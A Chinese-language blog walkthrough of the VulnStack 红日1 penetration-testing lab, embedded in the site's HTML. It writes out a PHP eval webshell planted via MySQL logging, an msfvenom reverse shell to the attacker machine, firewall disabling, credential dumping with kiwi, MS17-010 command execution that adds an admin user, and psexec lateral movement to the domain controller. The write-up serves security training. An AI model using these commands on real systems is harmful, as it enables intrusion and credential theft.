@@ -1,0 +1,320 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>VulnStack-红日1 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="cs,一种多人线上活动平台">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnStack-红日1">
+<meta property="og:url" content="https://4reexile.github.io/article/vulnstack-1/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="cs,一种多人线上活动平台">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-05-02T14:36:16.000Z">
+<meta property="article:modified_time" content="2024-07-05T11:06:17.696Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="msf">
+<meta property="article:tag" content="Kali">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="cs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/vulnstack-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'VulnStack-红日1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-05 19:06:17'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">VulnStack-红日1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-05-02T14:36:16.000Z" title="Created 2024-05-02 22:36:16">2024-05-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-05T11:06:17.696Z" title="Updated 2024-07-05 19:06:17">2024-07-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.7k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>写在前面: 本题使用了Cobalt Strike和fscan,并不是kali带有的工具,请自行下载</p>
+</blockquote>
+<h1>vulnstack红队1</h1>
+<p><strong>拍快照,拍快照,拍快照!</strong>不然你做不出来想要remake都做不到</p>
+<p>新增两个虚拟网络:
+192.168.52.0/24 内网环境(Vmnet1)
+192.168.72.0/24 外网环境(Vmnet2)</p>
+<blockquote>
+<p>靶机初始密码均为<code>hongrisec@2019</code></p>
+<p>当win7可以ping通所有ip地址, 环境就配置完成了</p>
+</blockquote>
+<ul>
+<li>
+<p>kali</p>
+<p>192.168.72.128</p>
+</li>
+<li>
+<p>Windows7 x64  密码更换为<code>hongrisec@2024</code>, 记得开启php
+192.168.72.129
+192.168.52.143</p>
+</li>
+<li>
+<p>Windows Server 2008 R2 x64  密码更换为<code>hongrisec@2024</code>
+192.168.52.138</p>
+</li>
+<li>
+<p>Win2K3 Metasploitable 配置如下图
+192.168.52.130</p>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502175114484.png" alt="image-20240502175114484"></p>
+<p>虽然因为配置是可以直接攻击域控的,但是题目本来是不行的,所以还是根据给的图来进行攻击</p>
+<blockquote>
+<p>可惜最后还是直接上域控了</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502102611922.png" alt="image-20240502102611922"></p>
+<h2 id="外网渗透"><a class="header-anchor" href="#外网渗透">¶</a>外网渗透</h2>
+<h3 id="主机发现"><a class="header-anchor" href="#主机发现">¶</a>主机发现</h3>
+<p>进行nmap扫描后可以得到自己的主机和在外网的主机<code>192.168.72.129</code>
+同时可以得到目标开放了80和3306端口, 先访问看看吧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.72.0/24</span><br><span class="line">// 当然还有什么 nmap -sU -p137 192.168.72.0/24 -T4 等</span><br></pre></td></tr></table></figure>
+<h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3>
+<p>用浏览器访问目标网页,发现是一个phpStudy探针, 里面有大量敏感信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绝对路径 C:/phpStudy/WWW</span><br><span class="line">Apache/2.4.23,  PHP/5.4.45</span><br><span class="line">可以直接执行 phpinfo();</span><br><span class="line">MySQL数据库,  SQLite/3.8.10.2</span><br></pre></td></tr></table></figure>
+<h3 id="目录扫描"><a class="header-anchor" href="#目录扫描">¶</a>目录扫描</h3>
+<p>利用<code>dirsearch</code>进行扫描, 可以得到<code>phpMyadmin</code>的目录信息
+尝试登录, 发现是弱密码, 账号密码都为root</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428183649795.png" alt="222"></p>
+<p>更换字典可以扫描到备份文件 (此处shell是因为已通过phpMyadmin进行getshell)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428184343918.png" alt="image-20240428184343918"></p>
+<h3 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h3>
+<ul>
+<li>phpMyadmin</li>
+</ul>
+<p>查询<code>secure_file_priv</code>属性, 发现为NULL, 采用日志写马</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;	<span class="operator">/</span><span class="operator">/</span> 查询日志状态</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>; <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%general%&#x27;</span>;	<span class="operator">/</span><span class="operator">/</span> 开启日志读写</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>然后用蚁剑连接就行,路径在网站根目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428182359427.png" alt="image-20240428182359427"></p>
+<ul>
+<li>yxcms</li>
+</ul>
+<p>通过查看下载下来的备份文件可以知道这似乎是yxcms网站</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428184744713.png" alt="image-20240428184744713"></p>
+<p>可以访问<code>192.168.72.129/yxcms/</code>来查看首页,右侧公告信息给出了敏感信息</p>
+<blockquote>
+<p>后台地址: /index.php?r=admin</p>
+<p>用户名: admin</p>
+<p>密码: 123456</p>
+</blockquote>
+<p>登录后发现可以更改模板php文件,写马即可
+修改<code>index_index.php</code>,直接在最上方加上一句话木马即可,随后蚁剑连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428190410498.png" alt="image-20240428190410498"></p>
+<p>不管什么方法,getshell后利用msf进行下一步: 上传反弹shell (随意放,放启动项是习惯)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/</span><br></pre></td></tr></table></figure>
+<p>然后用msf进行监听, 蚁剑运行上传的反弹木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 生成</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.128 lport=10000  -f exe -o win2.exe</span><br><span class="line">// 监听</span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.72.128</span><br><span class="line">set lport 10000</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>连接后进入<code>shell</code>进行内网信息收集</p>
+<h3 id="内网信息收集"><a class="header-anchor" href="#内网信息收集">¶</a>内网信息收集</h3>
+<ul>
+<li>域信息收集</li>
+</ul>
+<p>乱码使用<code>chcp 65001</code>解决</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami	// 当前权限  god\administrator</span><br><span class="line">ipconfig /all	// 查看网络信息  双网卡</span><br><span class="line">net user /domain	// 查看域用户 Administrator,Guest,krbtgt,ligang,liukaifeng01</span><br><span class="line">net config workstation	// 查看工作站配置信息</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428203341439.png" alt="image-20240428203341439"></p>
+<p>可以看到我们处于<code>GOD</code>域内</p>
+<p>查看arp缓存, 可以看到可能存活的主机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428204155230.png" alt="image-20240428204155230"></p>
+<p>通过ping域DNS名称来查找域控主机,得到域控<code>192.168.52.138</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428203752147.png" alt="image-20240428203752147"></p>
+<p>关闭win7防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+<ul>
+<li>密码抓取</li>
+</ul>
+<p>接下来提权到system权限,利用<code>getsystem</code>即可, 可以得到Administrator的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all	// 抓取全部</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428204429662.png" alt="image-20240428204429662"></p>
+<h2 id="内网渗透"><a class="header-anchor" href="#内网渗透">¶</a>内网渗透</h2>
+<h3 id="搭建路由和代理"><a class="header-anchor" href="#搭建路由和代理">¶</a>搭建路由和代理</h3>
+<p>先添加通向<code>192.168.52.0</code>内网的路由</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route add 192.168.52.0 255.255.255.0 1	// 数字是会话序号</span><br><span class="line">route print</span><br></pre></td></tr></table></figure>
+<p>利用msf搭建socks代理</p>
+<blockquote>
+<p>socks代理仅仅是为了代理工具,如果仅用msf进行操作,不需要搭建</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set version 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="横向移动"><a class="header-anchor" href="#横向移动">¶</a>横向移动</h3>
+<p>利用<code>fscan</code>进行扫描或者用<code>proxychains</code>代理扫描工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan64.exe -h 192.168.52.130</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502110334723.png" alt="image-20240502110334723"></p>
+<p>终究还是败给了cs的好用</p>
+<p>首先上传cs木马, 监听和连接,这里不在赘述,记得会话<strong>设置sleep为1</strong>,否则等半天</p>
+<ul>
+<li>搭建SMB Beacon</li>
+</ul>
+<blockquote>
+<p>SMB Beacon使用windows管道进行通信,可以把以此为枢纽,进行内外网的流量转发</p>
+</blockquote>
+<p>新建监听器, 选择payload为<code>Beacon SMB</code>,随便取名,我的取名为<code>smb</code></p>
+<p>然后在要建立<code>SMB Beacon</code>的beacon对话框中输入<code>spawn [name]</code>
+如下图,我在红色箭头的会话中输入了<code>spawn smb</code>,它的右侧就会多出来一个</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502183537269.png" alt="image-20240502183537269"></p>
+<p>我发现这里连不上另一个域成员却可以直接用psexec登录域控,这下坏了</p>
+<p>算了,就在这里结束吧,毕竟可以直接利用抓到的令牌进行psexec横向移动,给出步骤:</p>
+<p>切换视图然后右键,选择psexec</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502194355001.png" alt="image-20240502194355001"></p>
+<p>然后选择令牌,令牌看上去似乎很少或者没有就去抓取明文密码和抓取hash</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502194803642.png" alt="image-20240502194803642"></p>
+<p>监听器就选创建的smb和新出现的会话, <strong>注意这个OWA才是域控</strong>,看ip分辨</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502194854310.png" alt="image-20240502194854310"></p>
+<p>运行即可,一般出现<code>established link to child beacon: ip</code>就算成功,ip是谁创建的会话就是谁,不放心可以用<code>shell ipconfig</code>验证</p>
+<p>如下,原来的图新增一个会话,然后ip也正确,我们已经拿下域控了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502195104610.png" alt="image-20240502195104610"></p>
+<blockquote>
+<p>下面都是乱走的路,在此处没用</p>
+<p>假如你想看全程用msf利用psexec登录域控的,去看<code>vulnstack红队5</code>,但是msf不是很稳定</p>
+</blockquote>
+<p>利用telnet攻击:</p>
+<p>开放了445端口,扫出了MS17-010漏洞,尝试利用(换了好几个payload,这个行,可能是才疏学浅)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set command net user		// 此处为要执行的命令</span><br><span class="line">set rhost 192.168.52.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>可以执行命令就可以转变为建立一个用户然后用telnet连接或者利用3389远程连接</p>
+<blockquote>
+<p>虽然telnet只能上传文件不能执行,但是可以通过msf执行然后反弹shell</p>
+<p>再或者利用msf的模块直接建立会话</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set command net user test hack@2024 /add		// 新建用户,密码不能太简单,不能包含用户名</span><br><span class="line">set command net localgroup administrators test /add		// 加入管理员组,最好再看一眼用户列表</span><br><span class="line">set command sc config tlntsvr start= auto		// 打开telnet服务</span><br><span class="line">set command net start telnet		// 启动</span><br><span class="line">set command netstat -an		// 查看端口开启(23)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502120731187.png" alt="image-20240502120731187"></p>
+<p>尝试msf的telnet模块连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_login</span><br><span class="line">set rhosts 192.168.52.130</span><br><span class="line">set username test</span><br><span class="line">set password hack@2024</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502123330580.png" alt="image-20240502123330580"></p>
+<p>连接后这个session似乎不能执行命令,我猜测是因为这个模块是针对linux的,因为在尝试利用python,python3,script,socat等等进行会话建立</p>
+<p>手动进行telnet连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains telnet 192.168.52.130</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/vulnstack-1/">https://4reexile.github.io/article/vulnstack-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/msf/">msf</a><a class="post-meta__tags" href="/tags/Kali/">Kali</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><a class="post-meta__tags" href="/tags/cs/">cs</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/vulnstack-2/" title="VulnStack-红日2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">VulnStack-红日2</div></div></a></div><div class="next-post pull-right"><a href="/article/vulnstack-5/" title="VulnStack-红日5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">VulnStack-红日5</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/vulnstack-2/" title="VulnStack-红日2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-03</div><div class="title">VulnStack-红日2</div></div></a></div><div><a href="/article/vulnstack-5/" title="VulnStack-红日5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-27</div><div class="title">VulnStack-红日5</div></div></a></div><div><a href="/article/vulnstack-3/" title="vulnstack-红日3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-05</div><div class="title">vulnstack-红日3</div></div></a></div><div><a href="/article/lateral-movement/" title="横向移动"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-25</div><div class="title">横向移动</div></div></a></div><div><a href="/article/test-target-machine/" title="渗透测试靶机"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">渗透测试靶机</div></div></a></div><div><a href="/article/DerpNStink-1/" title="DerpNStink-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">DerpNStink-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">vulnstack红队1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.1.</span> <span class="toc-text">外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.5.</span> <span class="toc-text">内网信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E8%B7%AF%E7%94%B1%E5%92%8C%E4%BB%A3%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">搭建路由和代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">横向移动</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 